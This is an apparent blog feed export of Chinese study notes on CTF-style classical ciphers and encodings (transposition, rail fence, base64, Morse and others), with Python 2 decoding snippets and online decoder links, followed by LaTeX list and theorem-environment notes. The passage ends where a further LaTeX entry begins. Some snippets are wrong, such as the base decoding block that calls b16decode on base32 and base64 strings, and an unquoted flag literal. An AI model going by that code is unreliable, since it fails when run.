    <entry>
      <title>Crypto学习笔记(移位密码)</title>
      <link href="/2020/08/30/Crypto%E7%AC%94%E8%AE%B0-%E7%A7%BB%E4%BD%8D%E5%AF%86%E7%A0%81/"/>
      <url>/2020/08/30/Crypto%E7%AC%94%E8%AE%B0-%E7%A7%BB%E4%BD%8D%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h4 id="简单移位密码"><a href="#简单移位密码" class="headerlink" title="简单移位密码"></a>简单移位密码</h4><p>密文：lafgea{s_eyay_scyprt}o<br>密钥：3124<br>明文：flag{easy_easy_crypto}<br>解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift_decrypt</span>(<span class="params">c,k</span>):</span></span><br><span class="line">    l=len(k)</span><br><span class="line">    m=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),l):</span><br><span class="line">        tmp_m=[<span class="string">&quot;&quot;</span>]*l</span><br><span class="line">        <span class="keyword">if</span> i+l&gt;=len(c):</span><br><span class="line">            tmp_c=c[i:]</span><br><span class="line">            use=[]</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> range(len(tmp_c)):</span><br><span class="line">                use.append(int(k[kindex])-l)</span><br><span class="line">            use.sort()</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> range(len(tmp_c)):</span><br><span class="line">                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_c=c[i:i+l]</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> range(len(tmp_c)):</span><br><span class="line">                tmp_m[kindex]=tmp_c[int(k[kindex])<span class="number">-1</span>]</span><br><span class="line">        m+=<span class="string">&quot;&quot;</span>.join(tmp_m)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">c=<span class="string">&quot;lafgea&#123;s_eyay_scyprt&#125;o&quot;</span></span><br><span class="line">k=<span class="string">&quot;3124&quot;</span></span><br><span class="line"><span class="keyword">print</span> shift_decrypt(c,k)</span><br></pre></td></tr></table></figure><h4 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h4><p>特点:把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><p>密文:TEOGSDYUTAENN HLNETAMSHVAED<br>先将密文分为两行<br>T E O G S D Y U T A E N N<br>H L N E T A M S H V A E D<br>再按上下上下的顺序组合成一句话<br>明文:THE LONGEST DAY MUST HAVE AN END</p><p>解码：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p> <a id="more"></a><h4 id="曲路密码"><a href="#曲路密码" class="headerlink" title="曲路密码"></a>曲路密码</h4><p>曲路密码（Curve Cipher）是一种换位密码，需要事先双方约定密钥（也就是曲路路径）。下面给出一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：The quick brown fox jumps over the lazy dog</span><br></pre></td></tr></table></figure><p>填入 5 行 7 列表（事先约定填充的行列数）</p><div class="table-container"><table><thead><tr><th>T</th><th>h</th><th>e</th><th>q</th><th>u</th><th>i</th><th>c</th></tr></thead><tbody><tr><td>k</td><td>b</td><td>r</td><td>o</td><td>w</td><td>n</td><td>f</td></tr><tr><td>o</td><td>x</td><td>j</td><td>u</td><td>m</td><td>p</td><td>s</td></tr><tr><td>o</td><td>v</td><td>e</td><td>r</td><td>t</td><td>h</td><td>e</td></tr><tr><td>l</td><td>a</td><td>z</td><td>y</td><td>d</td><td>o</td><td>g</td></tr></tbody></table></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：gesfc inpho dtmwu qoury zejre hbxva lookT</span><br></pre></td></tr></table></figure><h4 id="列移位密码"><a href="#列移位密码" class="headerlink" title="列移位密码"></a>列移位密码</h4><p>明文 <code>The quick brown fox jumps over the lazy dog</code>，密钥 <code>how are u</code> </p><p>密钥： <code>how are u</code>，按 <code>how are u</code> 在字母表中的出现的先后顺序进行编号，我们就有 a 为 1，e 为 2，h 为 3，o 为 4，r 为 5，u 为 6，w 为 7，所以先写出 a 列，其次 e 列，以此类推写出的结果便是密文：</p><div class="table-container"><table><thead><tr><th>h</th><th>o</th><th>w</th><th>a</th><th>r</th><th>e</th><th>u</th></tr></thead><tbody><tr><td>3</td><td>4</td><td>7</td><td>1</td><td>5</td><td>2</td><td>6</td></tr><tr><td>T</td><td>h</td><td>e</td><td>q</td><td>u</td><td>i</td><td>c</td></tr><tr><td>k</td><td>b</td><td>r</td><td>o</td><td>w</td><td>n</td><td>f</td></tr><tr><td>o</td><td>x</td><td>j</td><td>u</td><td>m</td><td>p</td><td>s</td></tr><tr><td>o</td><td>v</td><td>e</td><td>r</td><td>t</td><td>h</td><td>e</td></tr><tr><td>l</td><td>a</td><td>z</td><td>y</td><td>d</td><td>o</td><td>g</td></tr></tbody></table></div><p>密文： <code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p><p>解码：<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/">http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/</a> 行列数相等</p><h4 id="云影密码"><a href="#云影密码" class="headerlink" title="云影密码"></a>云影密码</h4><p>特点：只有01248组成</p><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c01248_decode</span>(<span class="params">c</span>):</span></span><br><span class="line">    l=c.split(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    origin = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        tmp=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> i:</span><br><span class="line">            tmp+=int(num)</span><br><span class="line">        r+=origin[tmp<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="keyword">print</span> c01248_decode(<span class="string">&quot;8842101220480224404014224202480122&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习笔记(编码)</title>
      <link href="/2020/08/27/Crypto-%E7%BC%96%E7%A0%81/"/>
      <url>/2020/08/27/Crypto-%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h4 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h4><p>解码:<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p>字符串转化为编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&quot;flag&quot;</span><br><span class="line">print s.encode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure><p>编码转化为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print hex(num)[2:-1].decode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure><p>在解题过程中，一般使用PyCrypto库中的long_to_bytes和bytes_to_long函数进行转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import bytes_to_long</span><br><span class="line">c&#x3D;flag&#123;123456&#125;</span><br><span class="line">print bytes_to_long(c)</span><br></pre></td></tr></table></figure><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><p>特点:有%</p><p>解码:<a href="https://www.bejson.com/enc/urlencode/">https://www.bejson.com/enc/urlencode/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">d=<span class="string">&quot;%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d&quot;</span></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(d)</span><br></pre></td></tr></table></figure><h4 id="莫尔斯电码"><a href="#莫尔斯电码" class="headerlink" title="莫尔斯电码"></a>莫尔斯电码</h4><p>特点:由.和_组成的代码，中间以空格或者/间隔</p><p>解码:<a href="https://tool.lu/morse/">https://tool.lu/morse/</a></p> <a id="more"></a><h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>特点:只用 6 个字符 <a href></a>!+</p><p>解码:<a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></p><h4 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h4><p>特点:将二进制文件转化为文本文件</p><p>解码:<a href="https://www.qqxiuzi.cn/bianma/uuencode.php">https://www.qqxiuzi.cn/bianma/uuencode.php</a></p><h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p>特点:Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p><p>解码:<a href="http://tool.chinaz.com/Tools/Unicode.aspx">http://tool.chinaz.com/Tools/Unicode.aspx</a></p><h4 id="Base编码"><a href="#Base编码" class="headerlink" title="Base编码"></a>Base编码</h4><p>特点:base64 a-z A-Z 0-9 + / ==补位<br>         base32 A-Z 2-7 ==补位<br>         base16非常接近hex(base16是大写，然后hex是小写，其余不变）</p><p>解密:<a href="https://www.qqxiuzi.cn/bianma/base.php">https://www.qqxiuzi.cn/bianma/base.php</a></p><p>加密代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print &quot;flag&quot;.encode(&quot;base64&quot;)</span><br><span class="line">print base64.b16encode(&quot;flag&quot;)</span><br><span class="line">print base64.b32encode(&quot;flag&quot;)</span><br><span class="line">print base64.b64encode(&quot;flag&quot;)</span><br></pre></td></tr></table></figure><p>解密代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print &quot;ZmxhZw&#x3D;&#x3D;&quot;.decode(&quot;base64&quot;)</span><br><span class="line">print base64.b16decode(&quot;666C6167&quot;)</span><br><span class="line">print base64.b16decode(&quot;MZWGCZY&#x3D;&quot;)</span><br><span class="line">print base64.b16decode(&quot;ZmxhZw&#x3D;&#x3D;&quot;)</span><br></pre></td></tr></table></figure><p>通过Python解码详见 <a href="https://blog.csdn.net/xiayu729100940/article/details/103992470">https://blog.csdn.net/xiayu729100940/article/details/103992470</a></p><h4 id="中文电码"><a href="#中文电码" class="headerlink" title="中文电码"></a>中文电码</h4><p>特点:长度是四的倍数</p><p>解码:<a href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></p><p>密文:2053082329700207187313440356<br>明文:我喜欢信息安全<br>特征:长度是4的倍数</p><h4 id="Brainfuck-Ook"><a href="#Brainfuck-Ook" class="headerlink" title="Brainfuck/Ook!"></a>Brainfuck/Ook!</h4><p>特点:brainfuck语言用&gt; &lt; + - . , [ ]八种符号来替换C语言的各种语法和命令</p><p>​       Ook编码含有大量ook</p><p>解码:<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><h4 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h4><p>特点:佛曰</p><p>解码:<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p><h4 id="生僻字"><a href="#生僻字" class="headerlink" title="生僻字"></a>生僻字</h4><p>特点:含生僻字</p><p>解码:<a href="https://www.qqxiuzi.cn/zh/pinyin/">https://www.qqxiuzi.cn/zh/pinyin/</a></p><p>密文：淛匶襫黼瀬鎶<br>明文：这就是flag<br>特征：生僻字</p><h4 id="社会主义核心价值观编码"><a href="#社会主义核心价值观编码" class="headerlink" title="社会主义核心价值观编码"></a>社会主义核心价值观编码</h4><p>特点:含有社会主义核心价值观24字</p><p>解码:<a href="https://atool.vip/corevalue/">https://atool.vip/corevalue/</a></p><p>密文：诚信自由公正爱国爱国敬业民主友善爱国平等敬业公正敬业友善公正友善爱国公正友善自由诚信文明友善自由文明友善爱国自由诚信民主诚信平等诚信富强民主诚信自由公正爱国民主诚信富强诚信平等友善爱国平等友善自由诚信自由爱国敬业诚信自由平等爱国平等友善自由爱国<br>明文：我喜欢信息安全</p><h4 id="Ascii码"><a href="#Ascii码" class="headerlink" title="Ascii码"></a>Ascii码</h4><p>特点:进制数表示字符</p><p>解码:Ascii码与进制互转 <a href="http://ctf.ssleye.com/jinzhi.html">http://ctf.ssleye.com/jinzhi.html</a></p><h4 id="shellcode编码"><a href="#shellcode编码" class="headerlink" title="shellcode编码"></a>shellcode编码</h4><p>特点: 利用软件漏洞而执行的代码，shellcode为16进制的机器码</p><p>解码:参考 <a href="https://blog.csdn.net/qq_35519254/article/details/52957007">https://blog.csdn.net/qq_35519254/article/details/52957007</a></p><h4 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h4><p>特点:QP 编码用于表示含有大量对应可打印字符的数组 如=CD=F8=C9=CF,=C3=B3=D2=</p><p>解码:<a href="http://web.chacuo.net/charsetquotedprintable">http://web.chacuo.net/charsetquotedprintable</a></p><h4 id="XXencode编码"><a href="#XXencode编码" class="headerlink" title="XXencode编码"></a>XXencode编码</h4><p>特点:一种二进制到文字的编码!它跟UUEncode以及Base64编码方法很类似</p><p>解码:<a href="http://web.chacuo.net/charsetxxencode">http://web.chacuo.net/charsetxxencode</a></p><h4 id="Escape-Unescape编码"><a href="#Escape-Unescape编码" class="headerlink" title="Escape/Unescape编码"></a>Escape/Unescape编码</h4><p>特点:所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成%xx格式的字符编码xx等于该字符在字符集表里面的编码的16进制数字)。</p><p>解码:<a href="http://www.metools.info/master/m46.html">http://www.metools.info/master/m46.html</a></p><p>源文本:The</p><p>编码后:%u0054%u0068%u0065</p><h4 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h4><p>特点: 例如想要在HTML中插入空格，可以使用实体：&amp;nbsp；</p><p>解码:<a href="http://www.toolzl.com/tools/htmlende.html">http://www.toolzl.com/tools/htmlende.html</a></p><h4 id="敲击码-Tap-code"><a href="#敲击码-Tap-code" class="headerlink" title="敲击码(Tap code)"></a>敲击码(Tap code)</h4><p>特点:是一种以非常简单的方式对文本信息进行编码的方法。</p><p>敲击码表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!shell</span><br><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C&#x2F;K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>源文本</th><th>F</th><th>O</th><th>X</th></tr></thead><tbody><tr><td>位置</td><td>2,1</td><td>3,4</td><td>5,3</td></tr><tr><td>敲击码</td><td>..  .</td><td>…  ….</td><td>…..  …</td></tr></tbody></table></div><p>解码:<a href="http://ctf.ssleye.com/tapcode.html">http://ctf.ssleye.com/tapcode.html</a></p><h4 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h4><p>特点: (ﾟДﾟ) [‘_’]</p><p>解码:<br>打开谷歌浏览器–&gt;F12–&gt;点击Console–&gt;粘贴复制回车就会出现答案<br><a href="http://utf-8.jp/public/aaencode.html">http://utf-8.jp/public/aaencode.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX的一些小功能</title>
      <link href="/2020/08/26/LaTeX%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD/"/>
      <url>/2020/08/26/LaTeX%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h4 id="1-无序列表与有序列表"><a href="#1-无序列表与有序列表" class="headerlink" title="1.无序列表与有序列表"></a>1.无序列表与有序列表</h4><h5 id="1-1-无序列表"><a href="#1-1-无序列表" class="headerlink" title="1.1 无序列表"></a>1.1 无序列表</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;itemize&#125;</span></span></span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> one</span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> two</span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> ...</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;itemize&#125;</span></span></span><br></pre></td></tr></table></figure><h5 id="1-2-有序列表"><a href="#1-2-有序列表" class="headerlink" title="1.2 有序列表"></a>1.2 有序列表</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% \begin&#123;enumerate&#125;[i)] 通过添加参数可以控制有序列表的序列 </span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;enumerate&#125;</span></span></span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> one</span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> two</span><br><span class="line">  <span class="tag">\<span class="name">item</span></span> ...</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;enumerate&#125;</span></span></span><br><span class="line"><span class="comment">%或者用</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;description&#125;</span></span></span><br><span class="line">  <span class="tag">\<span class="name">item</span><span class="string">[item a]</span></span> one</span><br><span class="line">  <span class="tag">\<span class="name">item</span><span class="string">[item b]</span></span> two</span><br><span class="line">  <span class="tag">\<span class="name">item</span><span class="string">[item c]</span></span> ...</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;description&#125;</span></span></span><br></pre></td></tr></table></figure><h4 id="2-杂项"><a href="#2-杂项" class="headerlink" title="2.杂项"></a>2.杂项</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">textbf</span><span class="string">&#123;加粗&#125;</span></span> </span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">textit</span><span class="string">&#123;斜体 Italics&#125;</span></span></span><br><span class="line"></span><br><span class="line">生成脚注<span class="tag">\<span class="name">footnote</span><span class="string">&#123;脚注可以补充说明一些东西&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">newpage</span></span>  <span class="comment">%  强制分页</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">par</span></span>  <span class="comment">%  分段 或用两个回车 </span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">newline</span></span>  <span class="comment">%  换行 或者用 \\</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">mbox</span><span class="string">&#123;在数学环境下中输入中文&#125;</span></span>  <span class="comment">%实现在公式中输入中文</span></span><br></pre></td></tr></table></figure><h4 id="3-定理、证明等环境"><a href="#3-定理、证明等环境" class="headerlink" title="3.定理、证明等环境"></a>3.定理、证明等环境</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;theorem&#125;</span></span></span><br><span class="line">  这是一个定理。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;thm:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;theorem&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;thm:example&#125;</span></span>我们知道了定理环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;lemma&#125;</span></span></span><br><span class="line">  这是一个引理。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;lem:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;lemma&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;lem:example&#125;</span></span>我们知道了引理环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;corollary&#125;</span></span></span><br><span class="line">  这是一个推论。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;cor:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;corollary&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;cor:example&#125;</span></span>我们知道了推论环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;assumption&#125;</span></span></span><br><span class="line">  这是一个假设。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;asu:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;assumption&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;asu:example&#125;</span></span>我们知道了假设环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;conjecture&#125;</span></span></span><br><span class="line">  这是一个猜想。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;con:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;conjecture&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;con:example&#125;</span></span>我们知道了猜想环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;axiom&#125;</span></span></span><br><span class="line">  这是一个公理。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;axi:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;axiom&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;axi:example&#125;</span></span>我们知道了公理环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;principle&#125;</span></span></span><br><span class="line">  这是一个定律。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;pri:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;principle&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;pri:example&#125;</span></span>我们知道了定律环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;problem&#125;</span></span></span><br><span class="line">  这是一个问题。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;pro:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;problem&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;pro:example&#125;</span></span>我们知道了问题环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;example&#125;</span></span></span><br><span class="line">  这是一个例子。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;exa:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;example&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;exa:example&#125;</span></span>我们知道了例子环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;proof&#125;</span></span></span><br><span class="line">  这是一个证明。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;prf:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;proof&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;prf:example&#125;</span></span>我们知道了证明环境的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;solution&#125;</span></span></span><br><span class="line">  这是一个解。</span><br><span class="line">  <span class="tag">\<span class="name">label</span><span class="string">&#123;sol:example&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;solution&#125;</span></span></span><br><span class="line">由<span class="tag">\<span class="name">cref</span><span class="string">&#123;sol:example&#125;</span></span>我们知道了解环境的使用。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX中常用字符与运算符的输入</title>
      <link href="/2020/08/26/LaTeX%E4%B8%AD%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E8%BE%93%E5%85%A5/"/>
      <url>/2020/08/26/LaTeX%E4%B8%AD%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E8%BE%93%E5%85%A5/</url>
      
